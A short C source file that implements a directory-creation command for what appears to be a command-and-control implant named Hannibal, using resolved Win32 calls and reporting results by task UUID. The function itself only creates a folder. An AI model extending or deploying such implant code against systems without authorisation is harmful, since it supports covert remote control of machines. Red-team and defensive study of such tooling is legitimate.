#include "config.h"


#ifdef INCLUDE_CMD_MKDIR

#include "hannibal_tasking.h"


SECTION_CODE void cmd_mkdir(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_MKDIR *mk = (CMD_MKDIR *)t.cmd;
    LPCWSTR path = mk->path;

    
    DWORD fileAttr = hannibal_instance_ptr->Win32.GetFileAttributesW(path);
    if (fileAttr != INVALID_FILE_ATTRIBUTES && (fileAttr & FILE_ATTRIBUTE_DIRECTORY)) {
        hannibal_response(L"Already Exists", t.task_uuid);
    } else {
        if (hannibal_instance_ptr->Win32.CreateDirectoryW(path, NULL)) {
            hannibal_response(L"Succeeded", t.task_uuid);
        } else {
            DWORD errorCode = hannibal_instance_ptr->Win32.GetLastError();
            WCHAR error_message[256] = L"Error Code: ";
            WCHAR code_buffer[20];
            dword_to_wchar(errorCode, code_buffer, 10);
            pic_strcatW(error_message, code_buffer);        
            hannibal_response(error_message, t.task_uuid);
        }
    }

    hannibal_instance_ptr->Win32.VirtualFree(mk->path, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
    
}

#endif